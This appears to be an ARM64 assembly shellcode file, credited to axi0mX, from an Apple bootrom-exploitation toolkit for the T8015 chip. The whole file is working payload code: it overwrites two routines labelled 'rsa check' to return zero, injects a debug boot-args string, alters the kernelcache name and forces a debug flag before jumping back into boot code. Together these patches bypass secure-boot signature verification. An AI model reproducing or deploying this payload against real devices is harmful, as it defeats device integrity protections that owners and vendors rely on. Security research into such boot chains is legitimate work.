/* t8015_shellcode_arm64.S
 *
 * original author: axi0mX
 *
 * This program is free software: you can redistribute it and/or
 * modify it under the terms of the GNU General Public License as
 * published by the Free Software Foundation, either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

.text

.pool
.set JUMP_BACK,     0x180018004

.set WRITE_ADDR_1,  0x180030ad0 // rsa check
.set WRITE_ADDR_2,  0x180030b18 // rsa check
.set WRITE_ADDR_3,  0x180033e14 // bootargs
.set WRITE_ADDR_4,  0x18004d520 // bootargs str
.set WRITE_ADDR_5,  0x1800949f4 // kernelcache str
.set WRITE_ADDR_6,  0x18003289c // debug

.set WRITE_VALUE_3, 0x100cb878  // insn
.set WRITE_VALUE_5, 0x65686361  // kernelc[achd]

.set MOV_X0_0,      0xd2800000
.set MOV_X0_1,      0xd2800020

.globl _main
_main:
  MSR DAIFSET, #0xF

  LDR W6, =MOV_X0_0
  LDR X5, =WRITE_ADDR_1
  STR W6, [X5]
  LDR X5, =WRITE_ADDR_2
  STR W6, [X5]

  LDR X5, =WRITE_ADDR_3
  LDR W6, =WRITE_VALUE_3
  STR W6, [X5]

  LDR X5, =WRITE_ADDR_4
  LDR W6, =0x7065656b
  STR W6, [X5]
  LDR W6, =0x736d7973
  STR W6, [X5,#4]
  LDR W6, =0x6420313d
  STR W6, [X5,#8]
  LDR W6, =0x67756265
  STR W6, [X5,#12]
  LDR W6, =0x3178303d
  STR W6, [X5,#16]
  LDR W6, =0x6b206534
  STR W6, [X5,#20]
  LDR W6, =0x6c747865
  STR W6, [X5,#24]
  LDR W6, =0x303d676f
  STR W6, [X5,#28]
  LDR W6, =0x66666678
  STR W6, [X5,#32]
  LDR W6, =0x65732066
  STR W6, [X5,#36]
  LDR W6, =0x6c616972
  STR W6, [X5,#40]
  LDR W6, =0x3378303d
  STR W6, [X5,#44]

  LDR X5, =WRITE_ADDR_5
  LDR W6, =WRITE_VALUE_5
  STR W6, [X5]

  LDR X5, =WRITE_ADDR_6
  LDR W6, =MOV_X0_1
  STR W6, [X5]


  LDR X5, =JUMP_BACK
  BR  X5
